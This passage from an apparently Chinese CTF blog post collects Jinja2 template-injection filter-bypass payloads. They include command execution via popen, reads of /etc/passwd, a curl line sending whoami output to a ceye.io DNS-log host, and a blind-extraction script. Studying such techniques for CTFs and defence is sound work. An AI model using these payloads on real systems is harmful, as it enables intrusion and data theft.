class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>使用<code>getattr()</code>绕过</li></ul><p>这种方法有时候由于环境问题不一定可行，会报错<code>'getattr' is undefined</code>，所以优先使用以上两种</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; getattr((),<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;class <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="过滤引号">过滤引号</h4><p>过滤了<code>'</code>和<code>&quot;</code></p><ul><li><code>request</code>绕过</li></ul><p>flask中存在着<code>request</code>内置对象可以得到请求的信息，<code>request</code>可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request.cookies.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request.headers.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request.values.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure><p>payload如下</p><p><code>GET</code>方式，利用<code>request.args</code>传递参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><p><code>POST</code>方式，利用<code>request.values</code>传递参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post:arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><p><code>Cookie</code>方式，利用<code>request.cookies</code>传递参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cookie:arg1=open;arg2=/etc/passwd</span><br></pre></td></tr></table></figure><p>剩下两种方法也差不多，这里就不赘述了</p><ul><li>chr绕过</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[§<span class="number">0</span>§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里先爆破<code>subclasses</code>，获取<code>subclasses</code>中含有chr的类索引</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122829.png" alt="img"></p><p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p><p>这里我写了个脚本可以快速构造想要的ascii字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> $result .= <span class="string">&#x27;chr(&#x27;</span>.ord($a[$i]).<span class="string">&#x27;)%2b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo substr($result,<span class="number">0</span>,<span class="number">-3</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)</span></span><br></pre></td></tr></table></figure><p>最后payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr = ().__class__.__base__.__subclasses__()[<span class="number">7</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">257</span>].__init__.__globals__.popen(chr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">104</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">109</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤下划线">过滤下划线</h4><p>过滤了<code>_</code></p><ul><li>编码绕过</li></ul><p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p><p>payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">376</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string2=<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tohex(<span class="type">string</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="built_in">len</span>(<span class="type">string</span>)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+hex(ord(<span class="type">string</span>[i]))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(string2) #__class__</span><br></pre></td></tr></table></figure><p>随便构造个payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>]()[<span class="number">64</span>][<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;</span>](<span class="string">&quot;\x6f\x73&quot;</span>)[<span class="string">&quot;\x70\x6f\x70\x65\x6e&quot;</span>](<span class="string">&quot;whoami&quot;</span>)[<span class="string">&quot;\x72\x65\x61\x64&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>request</code>绕过</li></ul><p>在上面的过滤引号已经介绍过了，这里不再赘述</p><h4 id="过滤关键字">过滤关键字</h4><p>首先要看关键字是如何被过滤的</p><p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p><p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p><ul><li>拼接字符绕过</li></ul><p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用<code>+</code>号或者不用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>随便写个payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span><span class="string">&#x27;al&#x27;</span>](<span class="string">&quot;__im&quot;</span><span class="string">&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;</span><span class="string">&quot;pen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者可以使用join来进行拼接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure><p>看到有师傅甚至用管道符加上<code>format</code>方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的<code>%s</code>被<code>l</code>替换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure><ul><li>使用使用<code>str</code>原生函数</li></ul><p><code>replace</code>绕过，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;__claAss__&#x27;</span>.replace(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;&quot;</span>)).__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">376</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>decode</code>绕过，但这种方法经过测试只能在python2下使用，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>替代的方法</li></ul><p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__enter__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__exit__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤config，我们通常会用<code>&#123;&#123;config&#125;&#125;</code>获取当前设置，如果被过滤了可以使用以下的payload绕过</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤中括号">过滤中括号</h4><p>过滤了<code>[</code>和<code>]</code></p><ul><li>数字中的中括号</li></ul><p>在python里面可以使用以下方法访问数组元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;kawhi&quot;</span>,<span class="string">&quot;c&quot;</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;kawhi&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;kawhi&quot;</span>,<span class="string">&quot;c&quot;</span>].pop(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;kawhi&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;kawhi&quot;</span>,<span class="string">&quot;c&quot;</span>].__getitem__(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;kawhi&#x27;</span></span><br></pre></td></tr></table></figure><p>也就是说可以使用<code>__getitem__</code>和<code>pop</code>替代中括号，取列表的第n位</p><p>payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>魔术方法的中括号</li></ul><p>调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了class和中括号</p><p>可用<code>__getattribute__</code>绕过</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者可以配合<code>request</code>一起使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure><p>这种同样是绕过关键字的方法之一</p><h4 id="过滤双大括号">过滤双大括号</h4><p>过滤了<code>&#123;&#123;`和`&#125;&#125;</code></p><ul><li>使用dns外带数据</li></ul><p>用<code>&#123;%%&#125;</code>替代了<code>&#123;&#123;&#125;&#125;</code>，使用判断语句进行dns外带数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;kawhi&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>然后在ceye平台接收数据即可</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122799.png" alt="img"></p><ul><li>盲注</li></ul><p>如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> in r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = r<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c in s:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            password += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> password</span><br></pre></td></tr></table></figure><ul><li><code>print</code>标记</li></ul><p>我们上面之所以要dnslog外带数据以及使用盲注，是因为用<code>&#123;%%&#125;</code>会没有回显，这里的话可以使用<code>print</code>来做一个标记使得他有回显，比如<code>&#123;%print config%&#125;</code>，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure><h3 id="payload进阶与拓展">payload进阶与拓展</h3><p>这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展</p><h4 id="过滤-和-和">过滤<code>_</code>和<code>.</code>和<code>'</code></h4><p>这里顺便给一个不常见的方法，主要是找到<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>使用十六进制绕过后，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 